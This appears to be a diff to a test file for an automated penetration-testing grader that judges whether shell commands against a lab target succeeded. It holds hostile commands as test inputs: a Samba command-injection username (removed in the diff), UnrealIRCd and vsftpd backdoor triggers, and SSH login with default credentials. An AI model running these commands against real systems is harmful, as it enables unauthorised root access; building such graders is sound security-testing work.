@@ -59,7 +59,7 @@ def test_judge_vnc_rfb_banner():
 def test_judge_samba_share_list():
     """Samba smbclient 输出 share 列表"""
     out = "\tSharename       Type      Comment\n\t---------       ----      -------\n\tprint$          Disk      Printer Drivers"
-    r = judge_success("shell", "smbclient -L target -U './= `id`' -N", out, "", 0)
+    r = judge_success("shell", "smbclient -L target -N", out, "", 0)
     assert r.success is True
     assert r.evidence_type == "evidence"
     assert r.service == "samba"
@@ -95,3 +95,37 @@ def test_judge_connection_refused():
     r = judge_success("shell", "nc -w 5 target 3632", out, "", 1)
     assert r.success is False
     assert r.failure_reason == "conn_refused"
+
+
+def test_judge_vsftpd_backdoor_linux_output():
+    """vsftpd 后门 — Python socket 返回 Linux 系统信息"""
+    out = "Linux target 2.6.24-16-server #1 SMP\nuid=0(root) gid=0(root)"
+    r = judge_success("shell", "python3 -c 'import socket... vsftpd ... 6200'", out, "", 0)
+    assert r.success is True
+    assert r.evidence_type == "root_shell"
+
+
+def test_judge_unrealircd_banner_only():
+    """UnrealIRCd — 只收到 IRC banner（无 shell 输出）"""
+    out = ":irc.example.net NOTICE AUTH :*** Looking up your hostname...\n:irc.example.net NOTICE AUTH :*** Couldn't resolve your hostname"
+    r = judge_success("shell", "echo 'ABid' | nc -w 5 target 6667", out, "", 0)
+    assert r.success is True
+    assert r.evidence_type == "evidence"
+    assert r.service == "unrealircd"
+
+
+def test_judge_ssh_login_success():
+    """SSH 登录成功"""
+    out = "uid=0(root) gid=0(root) groups=0(root)"
+    r = judge_success("shell", "sshpass -p 'msfadmin' ssh -o StrictHostKeyChecking=no target id", out, "", 0)
+    assert r.success is True
+    assert r.evidence_type == "root_shell"
+
+
+def test_judge_java_rmi_registry():
+    """Java RMI 注册表枚举"""
+    out = "jmxrmi\n\tjavax.management.remote.rmi.RMIServerImpl_Stub"
+    r = judge_success("shell", "nmap -sV -p 1099 --script=rmi-dumpregistry target", out, "", 0)
+    assert r.success is True
+    assert r.evidence_type == "evidence"
+    assert r.service == "java_rmi"
